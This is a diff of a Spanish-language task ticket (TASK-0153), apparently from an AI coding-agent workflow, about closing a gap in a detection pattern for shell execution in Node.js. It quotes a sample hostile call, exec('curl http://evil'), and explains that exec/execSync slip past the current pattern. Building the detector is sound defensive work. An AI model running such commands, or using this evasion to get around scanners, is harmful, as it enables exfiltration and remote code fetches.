@@ -4,7 +4,7 @@ task_id: TASK-0153
 type: DIRECTIVE
 from: Arquitecto
 to: Codex
-status: open
+status: answered
 requires_response: false
 response_owner: Codex
 one_line_summary: "CAMBIO en TASK-0153 (no cierro aun): el Analista probo que child_process.exec/execSync NO estan en el patron cli (solo execFile*/spawn*), asi que exec('curl http://evil') / execSync(...) ESCAPAN. Marca el IMPORT de exec/execSync desde node:child_process (cero falso positivo: el src solo importa {execFile,spawn}); NO uses el bare exec( ingenuo (colisiona con RegExp.exec del src real). Re-entrega in_review. Lo demas (allowlist/eval/aislamiento) ya verde."
